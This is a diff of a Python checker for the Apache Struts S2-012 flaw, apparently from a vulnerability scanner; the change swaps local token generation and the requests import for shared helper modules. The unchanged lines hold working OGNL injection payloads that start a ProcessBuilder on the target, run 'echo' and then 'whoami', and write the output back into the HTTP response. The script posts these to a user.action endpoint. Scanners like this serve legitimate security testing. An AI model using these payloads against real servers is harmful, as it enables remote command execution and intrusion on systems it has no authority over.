@@ -8,19 +8,13 @@ description: S2-012漏洞可执行任意命令
 import sys
 import time
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_012_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.check_payload =  '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + '"echo",' + '\"' + self.capta + '\"' + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
         self.cmd_payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
         self.check_data = {'name': self.check_payload}    
@@ -39,10 +33,10 @@ class S2_012_BaseVerify:
                 self.url = "http://" + self.url
             if  '.action' not in self.url:
                 self.url = self.url + '/user.action'
-            check_res = requests.post(self.url, data = self.check_data, verify = False)
+            check_res = request.post(self.url, data = self.check_data)
             check_str = self.filter(list(check_res.text))
             if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
-                cmd_res = requests.post(self.url, data = self.cmd_data, verify = False)
+                cmd_res = request.post(self.url, data = self.cmd_data)
                 cmd_str = self.filter(list(cmd_res.text))
                 print ('存在S2-012漏洞,执行whoami命令成功，执行结果是:', cmd_str)
                 return True
